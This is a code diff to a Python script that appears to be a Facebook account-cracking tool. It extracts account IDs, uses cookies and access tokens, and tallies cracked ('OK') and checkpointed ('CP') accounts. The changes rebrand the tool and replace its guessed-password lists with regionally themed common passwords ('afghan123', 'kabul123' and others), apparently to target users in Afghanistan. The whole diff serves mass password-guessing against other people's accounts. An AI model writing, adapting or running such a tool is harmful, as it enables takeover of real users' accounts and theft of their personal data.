@@ -367,7 +367,7 @@ def manual_file(cookies,access_token):
         limit = int(input(' How many ids do you want to extract? '))
     except:
         limit = 1
-    print('\n \033[1;32mExample: /sdcard/AFAQ.txt \033[0;97m\n')
+    print('\n \033[1;32mExample: /sdcard/Saadat.txt \033[0;97m\n')
     sf = input(' Save file as: ')
     print(50*'-')
     for xd in range(limit):
@@ -522,7 +522,7 @@ def menu():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python AB KHANX.py')
+		os.system('python Saadat.py')
 	elif xd in ['2','02']:
 		create_file_login()
 	elif xd in ['3','03']:
@@ -589,9 +589,9 @@ def pak():
 				if pcs in ['1','01']:
 					passlist = [psx,ids]
 				elif pcs in ['2','02']:
-					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234']
+					passlist = [psx,ids,'afghan123','khan123','kabul123','۱۲۳۴۵۶']
 				else:
-					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234','Ali123','ali786','khan123','khan12345']
+					passlist = [psx,ids,'afghan123','khan123','786786','kabul1234','kabul123','۱۲۳۴۵۶','afghanistan','khost12']
 				if mthd in ['1','01']:
 					AXI.submit(rcrack1,ids,passlist)
 				else:
@@ -716,7 +716,7 @@ def gmail():
 
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [AFG] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;32m [Strat] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
